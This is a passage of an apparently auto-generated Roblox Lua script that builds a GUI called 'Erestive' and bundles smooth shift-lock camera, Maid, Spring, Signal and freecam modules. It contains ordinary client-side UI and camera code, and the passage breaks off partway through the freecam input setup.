G2L["51f"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["51f"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["51f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.InformationText.FL
G2L["520"] = Instance.new("Frame", G2L["518"]);
G2L["520"]["Visible"] = false;
G2L["520"]["BorderSizePixel"] = 0;
G2L["520"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["520"]["Size"] = UDim2.new(0, 57, 0, 28);
G2L["520"]["Position"] = UDim2.new(0, 0, 0.51697, 0);
G2L["520"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["520"]["Name"] = [[FL]];
G2L["520"]["LayoutOrder"] = 3;
G2L["520"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.FL.TextLabel
G2L["521"] = Instance.new("TextLabel", G2L["520"]);
G2L["521"]["TextWrapped"] = true;
G2L["521"]["TextStrokeTransparency"] = 0.58;
G2L["521"]["BorderSizePixel"] = 0;
G2L["521"]["TextSize"] = 14;
G2L["521"]["TextScaled"] = true;
G2L["521"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["521"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["521"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["521"]["BackgroundTransparency"] = 1;
G2L["521"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["521"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["521"]["Text"] = [[FL]];
G2L["521"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.InformationText.FL.TextLabel.UIPadding
G2L["522"] = Instance.new("UIPadding", G2L["521"]);
G2L["522"]["PaddingTop"] = UDim.new(0, 2);
G2L["522"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.InformationText.FL.TextLabel.Frame
G2L["523"] = Instance.new("Frame", G2L["521"]);
G2L["523"]["BorderSizePixel"] = 0;
G2L["523"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["523"]["Size"] = UDim2.new(1, 0, -0.08333, 0);
G2L["523"]["Position"] = UDim2.new(0, 0, 1.08333, 0);
G2L["523"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.InformationText.FL.UIListLayout
G2L["524"] = Instance.new("UIListLayout", G2L["520"]);
G2L["524"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["524"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["524"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.InformationText.F
G2L["525"] = Instance.new("Frame", G2L["518"]);
G2L["525"]["Visible"] = false;
G2L["525"]["BorderSizePixel"] = 0;
G2L["525"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["525"]["Size"] = UDim2.new(0, 57, 0, 28);
G2L["525"]["Position"] = UDim2.new(0, 0, 0.51697, 0);
G2L["525"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["525"]["Name"] = [[F]];
G2L["525"]["LayoutOrder"] = 3;
G2L["525"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.F.TextLabel
G2L["526"] = Instance.new("TextLabel", G2L["525"]);
G2L["526"]["TextWrapped"] = true;
G2L["526"]["TextStrokeTransparency"] = 0.58;
G2L["526"]["BorderSizePixel"] = 0;
G2L["526"]["TextSize"] = 14;
G2L["526"]["TextScaled"] = true;
G2L["526"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["526"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["526"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
G2L["526"]["BackgroundTransparency"] = 1;
G2L["526"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["526"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["526"]["Text"] = [[F]];
G2L["526"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.InformationText.F.TextLabel.UIPadding
G2L["527"] = Instance.new("UIPadding", G2L["526"]);
G2L["527"]["PaddingTop"] = UDim.new(0, 2);
G2L["527"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.InformationText.F.TextLabel.Frame
G2L["528"] = Instance.new("Frame", G2L["526"]);
G2L["528"]["BorderSizePixel"] = 0;
G2L["528"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["528"]["Size"] = UDim2.new(1, 0, -0.08333, 0);
G2L["528"]["Position"] = UDim2.new(0, 0, 1.08333, 0);
G2L["528"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.InformationText.F.UIListLayout
G2L["529"] = Instance.new("UIListLayout", G2L["525"]);
G2L["529"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["529"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["529"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.InformationText.HS
G2L["52a"] = Instance.new("Frame", G2L["518"]);
G2L["52a"]["Visible"] = false;
G2L["52a"]["BorderSizePixel"] = 0;
G2L["52a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52a"]["Size"] = UDim2.new(0, 57, 0, 28);
G2L["52a"]["Position"] = UDim2.new(0, 0, 0.44909, 0);
G2L["52a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52a"]["Name"] = [[HS]];
G2L["52a"]["LayoutOrder"] = 1;
G2L["52a"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.HS.TextLabel
G2L["52b"] = Instance.new("TextLabel", G2L["52a"]);
G2L["52b"]["TextWrapped"] = true;
G2L["52b"]["TextStrokeTransparency"] = 0.58;
G2L["52b"]["BorderSizePixel"] = 0;
G2L["52b"]["TextSize"] = 14;
G2L["52b"]["TextScaled"] = true;
G2L["52b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["52b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52b"]["BackgroundTransparency"] = 1;
G2L["52b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["52b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52b"]["Text"] = [[HS]];
G2L["52b"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.InformationText.HS.TextLabel.UIPadding
G2L["52c"] = Instance.new("UIPadding", G2L["52b"]);
G2L["52c"]["PaddingTop"] = UDim.new(0, 2);
G2L["52c"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.InformationText.HS.TextLabel.Frame
G2L["52d"] = Instance.new("Frame", G2L["52b"]);
G2L["52d"]["BorderSizePixel"] = 0;
G2L["52d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52d"]["Size"] = UDim2.new(1, 0, -0.08333, 0);
G2L["52d"]["Position"] = UDim2.new(0, 0, 1.08333, 0);
G2L["52d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.InformationText.HS.UIListLayout
G2L["52e"] = Instance.new("UIListLayout", G2L["52a"]);
G2L["52e"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["52e"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["52e"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.InformationText.BT
G2L["52f"] = Instance.new("Frame", G2L["518"]);
G2L["52f"]["Visible"] = false;
G2L["52f"]["BorderSizePixel"] = 0;
G2L["52f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52f"]["Size"] = UDim2.new(0, 57, 0, 28);
G2L["52f"]["Position"] = UDim2.new(0, 0, 0.44909, 0);
G2L["52f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52f"]["Name"] = [[BT]];
G2L["52f"]["LayoutOrder"] = 1;
G2L["52f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.BT.TextLabel
G2L["530"] = Instance.new("TextLabel", G2L["52f"]);
G2L["530"]["TextWrapped"] = true;
G2L["530"]["TextStrokeTransparency"] = 0.58;
G2L["530"]["BorderSizePixel"] = 0;
G2L["530"]["TextSize"] = 14;
G2L["530"]["TextScaled"] = true;
G2L["530"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["530"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["530"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["530"]["BackgroundTransparency"] = 1;
G2L["530"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["530"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["530"]["Text"] = [[BT]];
G2L["530"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.InformationText.BT.TextLabel.UIPadding
G2L["531"] = Instance.new("UIPadding", G2L["530"]);
G2L["531"]["PaddingTop"] = UDim.new(0, 2);
G2L["531"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.InformationText.BT.TextLabel.Frame
G2L["532"] = Instance.new("Frame", G2L["530"]);
G2L["532"]["BorderSizePixel"] = 0;
G2L["532"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["532"]["Size"] = UDim2.new(1, 0, -0.08333, 0);
G2L["532"]["Position"] = UDim2.new(0, 0, 1.08333, 0);
G2L["532"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.InformationText.BT.UIListLayout
G2L["533"] = Instance.new("UIListLayout", G2L["52f"]);
G2L["533"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["533"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["533"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.InformationText.RW
G2L["534"] = Instance.new("Frame", G2L["518"]);
G2L["534"]["Visible"] = false;
G2L["534"]["BorderSizePixel"] = 0;
G2L["534"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["534"]["Size"] = UDim2.new(0, 57, 0, 28);
G2L["534"]["Position"] = UDim2.new(0, 0, 0.44909, 0);
G2L["534"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["534"]["Name"] = [[RW]];
G2L["534"]["LayoutOrder"] = 1;
G2L["534"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.RW.TextLabel
G2L["535"] = Instance.new("TextLabel", G2L["534"]);
G2L["535"]["TextWrapped"] = true;
G2L["535"]["TextStrokeTransparency"] = 0.58;
G2L["535"]["BorderSizePixel"] = 0;
G2L["535"]["TextSize"] = 14;
G2L["535"]["TextScaled"] = true;
G2L["535"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["535"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["535"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["535"]["BackgroundTransparency"] = 1;
G2L["535"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["535"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["535"]["Text"] = [[RW]];
G2L["535"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.InformationText.RW.TextLabel.UIPadding
G2L["536"] = Instance.new("UIPadding", G2L["535"]);
G2L["536"]["PaddingTop"] = UDim.new(0, 2);
G2L["536"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.InformationText.RW.TextLabel.Frame
G2L["537"] = Instance.new("Frame", G2L["535"]);
G2L["537"]["BorderSizePixel"] = 0;
G2L["537"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["537"]["Size"] = UDim2.new(1, 0, -0.08333, 0);
G2L["537"]["Position"] = UDim2.new(0, 0, 1.08333, 0);
G2L["537"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.InformationText.RW.UIListLayout
G2L["538"] = Instance.new("UIListLayout", G2L["534"]);
G2L["538"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["538"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["538"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["9"]] = {
Closure = function()
    local script = G2L["9"];local SmoothShiftLock = {}
SmoothShiftLock.__index = SmoothShiftLock;

local Players = game:GetService("Players");
local WorkspaceService = game:GetService("Workspace");
local RunService = game:GetService("RunService");
local UserInputService = game:GetService("UserInputService");
local TweenService = game:GetService("TweenService");

local UtilsFolder = script:WaitForChild("Utils");

local Maid = require(UtilsFolder:WaitForChild("Maid"));
local Signal = require(UtilsFolder:WaitForChild("Signal"));
local Spring = require(UtilsFolder:WaitForChild("Spring"));

local LocalPlayer = Players.LocalPlayer;

local ToggleEvent = script:WaitForChild("ToggleShiftLock");
local EditConfig = script:WaitForChild("EditConfig");

local config = {
	["CHARACTER_SMOOTH_ROTATION"]   = false,
	["MANUALLY_TOGGLEABLE"]         = true,
	["CHARACTER_ROTATION_SPEED"]    = 3,
	["TRANSITION_SPRING_DAMPER"]    = 0.7,
	["CAMERA_TRANSITION_IN_SPEED"]  = 10,
	["CAMERA_TRANSITION_OUT_SPEED"] = 14,
	["LOCKED_CAMERA_OFFSET"]        = Vector3.new(1.75, 0.25, 0),
	["LOCKED_MOUSE_ICON"]           = "rbxasset://122523505593160",
	["SHIFT_LOCK_KEYBINDS"]         = {Enum.KeyCode.LeftControl},
}

local ENABLED = false;

local maid = Maid.new();

function SmoothShiftLock:Init()
	local _managerMaid = Maid.new();
	SmoothShiftLock.ShiftLockToggled = Signal.new();

	if LocalPlayer.Character then
		coroutine.wrap(function()
			self:CharacterAdded();
		end)();
	end;

	_managerMaid:GiveTask(LocalPlayer.CharacterAdded:Connect(function()
		coroutine.wrap(function()
			self:CharacterAdded();
		end)();
	end));
end;

function SmoothShiftLock:CharacterAdded()
	local self = setmetatable({}, SmoothShiftLock);
	self.Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
	self.RootPart = self.Character:WaitForChild("HumanoidRootPart");
	self.Humanoid = self.Character:WaitForChild("Humanoid");
	self.Head = self.Character:WaitForChild("Head");
	self.Camera = WorkspaceService.CurrentCamera;
	self._connectionsMaid = Maid.new();
	self.camOffsetSpring = Spring.new(Vector3.new(0, 0, 0));
	self.camOffsetSpring.Damper = config.TRANSITION_SPRING_DAMPER;

	self._connectionsMaid:GiveTask(UserInputService.InputBegan:Connect(function(input, gpe)
		if (gpe) or not config.MANUALLY_TOGGLEABLE then return end;

		for _, keyBind in pairs(config.SHIFT_LOCK_KEYBINDS) do
			if (input.KeyCode == keyBind) and (self.Humanoid and self.Humanoid.Health ~= 0) then
				self:ToggleShiftLock(not ENABLED);
			end;
		end;
	end));

	self._connectionsMaid:GiveTask(RunService.RenderStepped:Connect(function()
		if self.Head.LocalTransparencyModifier > 0.6 then return end;

		local camCF = self.Camera.CoordinateFrame;
		local distance = (self.Head.Position - camCF.p).magnitude;

		if (distance > 1) then	
			self.Camera.CFrame = (self.Camera.CFrame * CFrame.new(self.camOffsetSpring.Position)); 

			if (ENABLED) and (UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter) then
				self:SetMouseState(ENABLED);
			end;
		end;
	end));

	self._connectionsMaid:GiveTask(ToggleEvent.Event:Connect(function(toggle: boolean)
		if (self.Humanoid and self.Humanoid.Health ~= 0) then
			self:ToggleShiftLock(toggle);
		end;
	end));

	self._connectionsMaid:GiveTask(EditConfig.Event:Connect(function(toChange, value)
		if config[toChange] ~= nil then
			config[toChange] = value;
		end;
	end));

	self._connectionsMaid:GiveTask(self.Humanoid.Died:Connect(function()
		self:CharacterDiedOrRemoved();
		return;
	end));

	self._connectionsMaid:GiveTask(LocalPlayer.CharacterRemoving:Connect(function()
		self:CharacterDiedOrRemoved();
		return;
	end));

	return self;
end;

function SmoothShiftLock:CharacterDiedOrRemoved()
	self:ToggleShiftLock(false);

	if self._connectionsMaid ~= nil then
		self._connectionsMaid:Destroy();
	end;

	maid:DoCleaning();
end;

function SmoothShiftLock:IsEnabled(): boolean
	return ENABLED;
end;

function SmoothShiftLock:SetMouseState(enable : boolean)
	UserInputService.MouseBehavior = (enable and Enum.MouseBehavior.LockCenter) or (Enum.MouseBehavior.Default);
end;

function SmoothShiftLock:SetMouseIcon(enable : boolean)
	UserInputService.MouseIcon = (enable and config.LOCKED_MOUSE_ICON :: string) or "";
end;

function SmoothShiftLock:TransitionLockOffset(enable : boolean)
	if (enable) then
		self.camOffsetSpring.Speed = config.CAMERA_TRANSITION_IN_SPEED;
		self.camOffsetSpring.Target = config.LOCKED_CAMERA_OFFSET;
	else
		self.camOffsetSpring.Speed = config.CAMERA_TRANSITION_OUT_SPEED;
		self.camOffsetSpring.Target = Vector3.new(0, 0, 0);
	end;
end;

function SmoothShiftLock:ToggleShiftLock(enable : boolean)
	assert(typeof(enable) == typeof(false), "Enable value is not a boolean.");
	ENABLED = enable;

	self:SetMouseState(ENABLED);
	self:SetMouseIcon(ENABLED);
	self:TransitionLockOffset(ENABLED);

	if (ENABLED) then
		maid:GiveTask(RunService.RenderStepped:Connect(function(delta)
			if (self.Humanoid and self.RootPart) then 
				self.Humanoid.AutoRotate = not ENABLED;
			end;

			if (ENABLED) then
				if not (self.Humanoid.Sit) and (config.CHARACTER_SMOOTH_ROTATION) then
					local x, y, z = self.Camera.CFrame:ToOrientation();
					self.RootPart.CFrame = self.RootPart.CFrame:Lerp(CFrame.new(self.RootPart.Position) * CFrame.Angles(0, y, 0), delta * 5 * config.CHARACTER_ROTATION_SPEED);
				elseif not (self.Humanoid.Sit) then
					local x, y, z = self.Camera.CFrame:ToOrientation();
					self.RootPart.CFrame = CFrame.new(self.RootPart.Position) * CFrame.Angles(0, y, 0);
				end;
			end;

			if not (ENABLED) then 
				maid:Destroy() end;
		end));
	end;

	SmoothShiftLock.ShiftLockToggled:Fire(ENABLED);

	return self;
end;

return SmoothShiftLock;

end;
};
G2L_MODULES[G2L["b"]] = {
Closure = function()
    local script = G2L["b"];local Maid = {}
Maid.ClassName = "Maid"

function Maid.new()
	return setmetatable({
		_tasks = {}
	}, Maid)
end

function Maid.isMaid(value)
	return type(value) == "table" and value.ClassName == "Maid"
end

function Maid:__index(index)
	if Maid[index] then
		return Maid[index]
	else
		return self._tasks[index]
	end
end

function Maid:__newindex(index, newTask)
	if Maid[index] ~= nil then
		error(("Cannot use '%s' as a Maid key"):format(tostring(index)), 2)
	end

	local tasks = self._tasks
	local oldTask = tasks[index]

	if oldTask == newTask then
		return
	end

	tasks[index] = newTask

	if oldTask then
		if type(oldTask) == "function" then
			oldTask()
		elseif type(oldTask) == "thread" then
			task.cancel(oldTask)
		elseif typeof(oldTask) == "RBXScriptConnection" then
			oldTask:Disconnect()
		elseif oldTask.Destroy then
			oldTask:Destroy()
		end
	end
end

function Maid:GiveTask(task)
	if not task then
		error("Task cannot be false or nil", 2)
	end

	local taskId = #self._tasks+1
	self[taskId] = task

	if type(task) == "table" and (not task.Destroy) then
		warn("[Maid.GiveTask] - Gave table task without .Destroy\n\n" .. debug.traceback())
	end

	return taskId
end

function Maid:GivePromise(promise)
	if not promise:IsPending() then
		return promise
	end

	local newPromise = promise.resolved(promise)
	local id = self:GiveTask(newPromise)

	newPromise:Finally(function()
		self[id] = nil
	end)

	return newPromise
end

function Maid:DoCleaning()
	local tasks = self._tasks

	for index, job in pairs(tasks) do
		if typeof(job) == "RBXScriptConnection" then
			tasks[index] = nil
			job:Disconnect()
		end
	end

	local index, job = next(tasks)
	while job ~= nil do
		tasks[index] = nil
		if type(job) == "function" then
			job()
		elseif type(job) == "thread" then
			task.cancel(job)
		elseif typeof(job) == "RBXScriptConnection" then
			job:Disconnect()
		elseif job.Destroy then
			job:Destroy()
		end
		index, job = next(tasks)
	end
end

Maid.Destroy = Maid.DoCleaning

return Maid

end;
};
G2L_MODULES[G2L["c"]] = {
Closure = function()
    local script = G2L["c"];local Spring = {}

function Spring.new(initial, clock)
	local target = initial or 0
	clock = clock or os.clock
	return setmetatable({
		_clock = clock;
		_time0 = clock();
		_position0 = target;
		_velocity0 = 0*target;
		_target = target;
		_damper = 1;
		_speed = 1;
	}, Spring)
end

function Spring:Impulse(velocity)
	self.Velocity = self.Velocity + velocity
end

function Spring:TimeSkip(delta)
	local now = self._clock()
	local position, velocity = self:_positionVelocity(now+delta)
	self._position0 = position
	self._velocity0 = velocity
	self._time0 = now
end

function Spring:__index(index)
	if Spring[index] then
		return Spring[index]
	elseif index == "Value" or index == "Position" or index == "p" then
		local position, _ = self:_positionVelocity(self._clock())
		return position
	elseif index == "Velocity" or index == "v" then
		local _, velocity = self:_positionVelocity(self._clock())
		return velocity
	elseif index == "Target" or index == "t" then
		return self._target
	elseif index == "Damper" or index == "d" then
		return self._damper
	elseif index == "Speed" or index == "s" then
		return self._speed
	elseif index == "Clock" then
		return self._clock
	else
		error(("%q is not a valid member of Spring"):format(tostring(index)), 2)
	end
end

function Spring:__newindex(index, value)
	local now = self._clock()

	if index == "Value" or index == "Position" or index == "p" then
		local _, velocity = self:_positionVelocity(now)
		self._position0 = value
		self._velocity0 = velocity
		self._time0 = now
	elseif index == "Velocity" or index == "v" then
		local position, _ = self:_positionVelocity(now)
		self._position0 = position
		self._velocity0 = value
		self._time0 = now
	elseif index == "Target" or index == "t" then
		local position, velocity = self:_positionVelocity(now)
		self._position0 = position
		self._velocity0 = velocity
		self._target = value
		self._time0 = now
	elseif index == "Damper" or index == "d" then
		local position, velocity = self:_positionVelocity(now)
		self._position0 = position
		self._velocity0 = velocity
		self._damper = value
		self._time0 = now
	elseif index == "Speed" or index == "s" then
		local position, velocity = self:_positionVelocity(now)
		self._position0 = position
		self._velocity0 = velocity
		self._speed = value < 0 and 0 or value
		self._time0 = now
	elseif index == "Clock" then
		local position, velocity = self:_positionVelocity(now)
		self._position0 = position
		self._velocity0 = velocity
		self._clock = value
		self._time0 = value()
	else
		error(("%q is not a valid member of Spring"):format(tostring(index)), 2)
	end
end

function Spring:_positionVelocity(now)
	local p0 = self._position0
	local v0 = self._velocity0
	local p1 = self._target
	local d = self._damper
	local s = self._speed

	local t = s*(now - self._time0)
	local d2 = d*d

	local h, si, co
	if d2 < 1 then
		h = math.sqrt(1 - d2)
		local ep = math.exp(-d*t)/h
		co, si = ep*math.cos(h*t), ep*math.sin(h*t)
	elseif d2 == 1 then
		h = 1
		local ep = math.exp(-d*t)/h
		co, si = ep, ep*t
	else
		h = math.sqrt(d2 - 1)
		local u = math.exp((-d + h)*t)/(2*h)
		local v = math.exp((-d - h)*t)/(2*h)
		co, si = u + v, u - v
	end

	local a0 = h*co + d*si
	local a1 = 1 - (h*co + d*si)
	local a2 = si/s

	local b0 = -s*si
	local b1 = s*si
	local b2 = h*co - d*si

	return
		a0*p0 + a1*p1 + a2*v0,
	b0*p0 + b1*p1 + b2*v0
end

return Spring

end;
};
G2L_MODULES[G2L["d"]] = {
Closure = function()
    local script = G2L["d"];local HttpService = game:GetService("HttpService")

local ENABLE_TRACEBACK = false

local Signal = {}
Signal.__index = Signal
Signal.ClassName = "Signal"

function Signal.isSignal(value)
	return type(value) == "table"
		and getmetatable(value) == Signal
end

function Signal.new()
	local self = setmetatable({}, Signal)

	self._bindableEvent = Instance.new("BindableEvent")
	self._argMap = {}
	self._source = ENABLE_TRACEBACK and debug.traceback() or ""

	self._bindableEvent.Event:Connect(function(key)
		self._argMap[key] = nil
		if (not self._bindableEvent) and (not next(self._argMap)) then
			self._argMap = nil
		end
	end)

	return self
end

function Signal:Fire(...)
	if not self._bindableEvent then
		warn(("Signal is already destroyed. %s"):format(self._source))
		return
	end

	local args = table.pack(...)
	local key = HttpService:GenerateGUID(false)
	self._argMap[key] = args
	self._bindableEvent:Fire(key)
end

function Signal:Connect(handler)
	if not (type(handler) == "function") then
		error(("connect(%s)"):format(typeof(handler)), 2)
	end

	return self._bindableEvent.Event:Connect(function(key)
		local args = self._argMap[key]
		if args then
			handler(table.unpack(args, 1, args.n))
		else
			error("Missing arg data, probably due to reentrance.")
		end
	end)
end

function Signal:Wait()
	local key = self._bindableEvent.Event:Wait()
	local args = self._argMap[key]
	if args then
		return table.unpack(args, 1, args.n)
	else
		error("Missing arg data, probably due to reentrance.")
		return nil
	end
end

function Signal:Destroy()
	if self._bindableEvent then
		self._bindableEvent:Destroy()
		self._bindableEvent = nil
	end

	setmetatable(self, nil)
end

return Signal

end;
};
-- StarterGui.Erestive.Insert2
local function C_2()
local script = G2L["2"];
	local UserInputService = game:GetService("UserInputService")
	
	function onKeyPress(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
	    if inputObject.KeyCode == Enum.KeyCode.RightAlt then 
				if script.Parent.MainFrame.Visible == false then
					script.Parent.MainFrame.Visible = true
				else
					script.Parent.MainFrame.Visible = false
				end
			end
		end
	end
	
	UserInputService.InputBegan:connect(onKeyPress)
end;
task.spawn(C_2);
-- StarterGui.Erestive.FreecamScript
local function C_6()
local script = G2L["6"];
	local plr = game.Players.LocalPlayer
	
	------------------------------------------------------------------------
	-- Freecam
	-- Cinematic free camera for spectating and video production.
	
	------------------------------------------------------------------------
	
	local pi    = math.pi
	local abs   = math.abs
	local clamp = math.clamp
	local exp   = math.exp
	local rad   = math.rad
	local sign  = math.sign
	local sqrt  = math.sqrt
	local tan   = math.tan
	
	local ContextActionService = game:GetService("ContextActionService")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local StarterGui = game:GetService("StarterGui")
	local UserInputService = game:GetService("UserInputService")
	local Workspace = game:GetService("Workspace")
	
	local LocalPlayer = Players.LocalPlayer
	if not LocalPlayer then
		Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
		LocalPlayer = Players.LocalPlayer
	end
	
	local Camera = Workspace.CurrentCamera
	Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local newCamera = Workspace.CurrentCamera
		if newCamera then
			Camera = newCamera
		end
	end)
	
	------------------------------------------------------------------------
	
	local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
	local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
	local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}
	
	local NAV_GAIN = Vector3.new(1, 1, 1)*64
	local PAN_GAIN = Vector2.new(0.75, 1)*8
	local FOV_GAIN = 300
	
	local PITCH_LIMIT = rad(90)
	
	local VEL_STIFFNESS = 1.5
	local PAN_STIFFNESS = 1.0
	local FOV_STIFFNESS = 4.0
	
	------------------------------------------------------------------------
	
	local Spring = {} do
		Spring.__index = Spring
	
		function Spring.new(freq, pos)
			local self = setmetatable({}, Spring)
			self.f = freq
			self.p = pos
			self.v = pos*0
			return self
		end
	
		function Spring:Update(dt, goal)
			local f = self.f*2*pi
			local p0 = self.p
			local v0 = self.v
	
			local offset = goal - p0
			local decay = exp(-f*dt)
	
			local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
			local v1 = (f*dt*(offset*f - v0) + v0)*decay
	
			self.p = p1
			self.v = v1
	
			return p1
		end
	
		function Spring:Reset(pos)
			self.p = pos
			self.v = pos*0
		end
	end
	
	------------------------------------------------------------------------
	
	local cameraPos = Vector3.new()
	local cameraRot = Vector2.new()
	local cameraFov = 0
	
	local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
	local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
	local fovSpring = Spring.new(FOV_STIFFNESS, 0)
	
	------------------------------------------------------------------------
	
	local Input = {} do
		local thumbstickCurve do
			local K_CURVATURE = 2.0
			local K_DEADZONE = 0.15
	
			local function fCurve(x)
				return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
			end
	
			local function fDeadzone(x)
				return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
			end
	
			function thumbstickCurve(x)
				return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
			end
		end
	
		local gamepad = {
			ButtonX = 0,
			ButtonY = 0,
			DPadDown = 0,
			DPadUp = 0,
			ButtonL2 = 0,
			ButtonR2 = 0,
			Thumbstick1 = Vector2.new(),
			Thumbstick2 = Vector2.new(),
		}
	
		local keyboard = {
			W = 0,
			A = 0,
			S = 0,
			D = 0,
			E = 0,
			Q = 0,
			U = 0,
			H = 0,
			J = 0,
			K = 0,
			I = 0,
			Y = 0,
			Up = 0,
			Down = 0,
			LeftShift = 0,
			RightShift = 0,
		}
	
		local mouse = {
			Delta = Vector2.new(),
			MouseWheel = 0,
		}
	
		local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
		local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
